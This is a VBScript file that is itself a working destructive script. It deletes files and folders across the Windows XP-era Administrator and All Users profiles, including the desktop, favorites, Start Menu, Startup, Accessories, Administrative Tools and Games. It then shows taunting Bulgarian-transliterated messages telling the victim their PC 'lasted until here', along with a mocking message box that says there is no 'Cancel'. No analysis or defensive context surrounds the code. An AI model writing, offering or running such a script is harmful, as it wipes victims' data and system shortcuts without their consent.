   set getf=createobject("scripting.filesystemobject")
   getf.deletefile ("C:\Documents and Settings\Administrator\Desktop\*.*")
   getf.deletefile ("C:\Documents and Settings\Administrator\Favorites\*.*")
   getf.deletefolder ("C:\Documents and Settings\Administrator\Desktop")
   getf.deletefile ("C:\Documents and Settings\Administrator\Local Settings\Application Data\*.*")
   getf.deletefile ("C:\Documents and Settings\Administrator\Start Menu\Programs\*.*")
   getf.deletefile ("C:\Documents and Settings\Administrator\Start Menu\*.*")
   getf.deletefile ("C:\Documents and Settings\Administrator\Start Menu\Programs\Startup\*.*")
   getf.deletefolder ("C:\Documents and Settings\Administrator\Start Menu\Programs\Startup")
   getf.deletefile ("C:\Documents and Settings\Administrator\Start Menu\Programs\Accessories\*.*")
   getf.deletefile ("C:\Documents and Settings\Administrator\Start Menu\Programs\Accessories\Accessibility\*.*")
   getf.deletefolder ("C:\Documents and Settings\Administrator\Start Menu\Programs\Accessories\Accessibility")
   getf.deletefile ("C:\Documents and Settings\Administrator\Start Menu\Programs\Accessories\Entertainment\*.*")
   getf.deletefolder ("C:\Documents and Settings\Administrator\Start Menu\Programs\Accessories\Entertainment")
   getf.deletefolder ("C:\Documents and Settings\Administrator\Start Menu\Programs\Accessories")



   getf.deletefile ("C:\Documents and Settings\All Users\Desktop\*.*")
   getf.deletefile ("C:\Documents and Settings\All Users\Favorites\*.*")
   getf.deletefolder ("C:\Documents and Settings\All Users\Desktop")
   getf.deletefile ("C:\Documents and Settings\All Users\Local Settings\Application Data\*.*")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\*.*")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\*.*")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup\*.*")
   getf.deletefolder ("C:\Documents and Settings\All Users\Start Menu\Programs\Startup")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\*.*")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\Accessibility\*.*")
   getf.deletefolder ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\Accessibility")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\Entertainment\*.*")
   getf.deletefolder ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\Entertainment")
   getf.deletefolder ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\Communications\*.*")
   getf.deletefolder ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\Communications")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools\*.*")
   getf.deletefolder ("C:\Documents and Settings\All Users\Start Menu\Programs\Administrative Tools")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools\*.*")
   getf.deletefolder ("C:\Documents and Settings\All Users\Start Menu\Programs\Accessories\System Tools")
   getf.deletefile ("C:\Documents and Settings\All Users\Start Menu\Programs\Games\*.*")
   getf.deletefolder ("C:\Documents and Settings\All Users\Start Menu\Programs\Games")





   Wscript.echo "Pc-to ti beshe do tuk!"
   Wscript.echo "Spoko we,buzikam se....moje i da izkara do kraq na denq ;)"
   dim msg
    msg = MsgBox("Iska6 da znae6 kvo stava?!",vbAbort+vbInformation,"MsgBox test")
   If msg =  vbYes then
   Wscript.echo "E, sam 6e  razbere6"
   end if
   If msg = vbNo then
   Wscript.echo "Za mnogo znae6t li se misli6?! Ae da te vidim kakvo 6e narpai6 sea..."
   end if
   If msg = vbCancel then
   Wscript.echo "'Cancel' tuka nqma :D"
   end if
